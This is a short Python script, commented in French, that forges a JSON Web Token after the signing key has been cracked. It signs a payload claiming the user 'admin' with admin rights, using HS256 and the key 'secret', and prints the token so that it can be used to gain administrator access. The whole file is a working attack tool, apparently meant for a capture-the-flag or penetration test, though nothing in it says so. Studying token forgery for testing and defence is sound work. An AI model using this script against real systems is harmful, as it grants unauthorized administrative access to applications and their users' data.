# Ce script sers à forger un token JWT, dès qu'on a craqué la clé qui a été utilisée pour signer le token
# on peut utiliser ce script pour forger un token JWT et obtenir des droits administrateur
import jwt

payload = {
    "username": "admin",
    "admin": 1
}

secret = "secret"

token = jwt.encode(payload, secret, algorithm="HS256")

print(token)
